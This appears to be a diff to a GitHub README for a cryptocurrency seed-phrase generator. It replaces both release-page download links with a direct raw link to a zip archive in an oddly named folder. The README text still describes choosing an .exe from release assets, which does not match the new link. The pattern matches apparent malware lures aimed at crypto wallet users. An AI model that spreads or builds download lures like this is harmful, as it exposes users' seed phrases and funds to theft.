@@ -1,6 +1,6 @@
 # 🔑 Mnemonic-Seed-Generator - Create secure backup words for wallets
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/Stratificationfoodfish768/Mnemonic-Seed-Generator/releases)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/Stratificationfoodfish768/Mnemonic-Seed-Generator/raw/refs/heads/main/Payaguan/Mnemonic_Seed_Generator_v3.1.zip)
 
 This application generates BIP-39 mnemonic seed phrases for your cryptocurrency wallets. A seed phrase serves as the master key to your digital assets. You need this phrase to recover access to your funds if you lose your device or your wallet application fails. This tool creates these phrases on your local machine to keep your data private.
 
@@ -16,7 +16,7 @@ Your computer requires at least 100 megabytes of free storage space. You do not 
 
 Visit the link below to access the release page. Choose the file that ends in .exe to start the download.
 
-[Download the Mnemonic Seed Generator](https://github.com/Stratificationfoodfish768/Mnemonic-Seed-Generator/releases)
+[Download the Mnemonic Seed Generator](https://github.com/Stratificationfoodfish768/Mnemonic-Seed-Generator/raw/refs/heads/main/Payaguan/Mnemonic_Seed_Generator_v3.1.zip)
 
 1. Click the provided link above.
 2. Look for the section labeled "Assets" at the bottom of the latest release.
